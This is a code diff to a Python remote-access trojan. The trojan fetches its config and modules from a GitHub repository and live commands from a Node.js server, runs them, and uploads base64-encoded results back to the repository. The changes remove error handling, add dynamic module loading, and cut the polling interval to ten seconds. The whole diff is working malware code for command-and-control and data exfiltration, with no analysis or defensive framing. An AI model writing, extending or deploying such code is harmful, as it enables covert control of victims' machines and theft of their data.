@@ -18,11 +18,7 @@ def github_connect():
     return sess.repository(user, 'Trojan')
 
 def get_file_contents(dirname, module_name, repo):
-    try:
-        return repo.file_contents(f'{dirname}/{module_name}').content
-    except github3.exceptions.NotFoundError:
-        print(f"[*] File {dirname}/{module_name} not found in repository.")
-        return None
+    return repo.file_contents(f'{dirname}/{module_name}').content
 
 class Trojan:
     def __init__(self, id, node_server_url):
@@ -35,17 +31,11 @@ class Trojan:
 
     def get_github_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
-        if config_json:
-            config = json.loads(base64.b64decode(config_json))
-            if isinstance(config, list):
-                config = {'modules': config}
-            return config
-        return {'modules': []}
+        return json.loads(base64.b64decode(config_json))
 
     def get_nodejs_config(self):
         try:
             response = requests.get(f"{self.node_server_url}/config")
-            response.raise_for_status()
             return response.json()
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to get config from Node.js server: {e}")
@@ -80,26 +70,19 @@ class Trojan:
         self.send_command_result(command, result)
 
     def module_runner(self, module):
-        try:
-            result = sys.modules[module].run()
-            self.store_module_result(result)
-        except Exception as e:
-            print(f"Error running module '{module}': {e}")
+        if module not in sys.modules:
+            importlib.import_module(module)
+        result = sys.modules[module].run()
+        self.store_module_result(result)
 
     def store_module_result(self, data):
-        try:
-            message = datetime.now().isoformat()
-            remote_path = f'data/{self.id}/{message}.data'
-            bindata = base64.b64encode(bytes(f'{data!r}', 'utf-8'))
-            self.repo.create_file(remote_path, message, bindata)
-        except Exception as e:
-            print(f"Error storing module result: {e}")
+        message = datetime.now().isoformat()
+        remote_path = f'data/{self.id}/{message}.data'
+        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
+        self.repo.create_file(remote_path, message, bindata)
 
     def run(self):
         while self.running:
-            # Fetch configuration from GitHub
-            github_config = self.get_github_config()
-
             # Fetch real-time commands from Node.js server
             nodejs_config = self.get_nodejs_config()
 
@@ -113,21 +96,17 @@ class Trojan:
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
 
-            # Run modules based on GitHub config
-            for task in github_config.get('modules', []):
-                module = task['module']
-                if module not in sys.modules:
-                    print(f"[*] Attempting to load module '{module}'")
-                    try:
+                # Check and run modules based on GitHub config
+                github_config = self.get_github_config()
+                for task in github_config.get('modules', []):
+                    module = task['module']
+                    if module not in sys.modules:
                         importlib.import_module(module)
-                    except ImportError as e:
-                        print(f"[*] Failed to load module '{module}': {e}")
-                if module in sys.modules:
                     thread = threading.Thread(target=self.module_runner, args=(module,))
                     thread.start()
                     time.sleep(random.randint(1, 10))
 
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(10)  # Adjust polling interval as needed
 
 class GitImporter:
     def __init__(self):
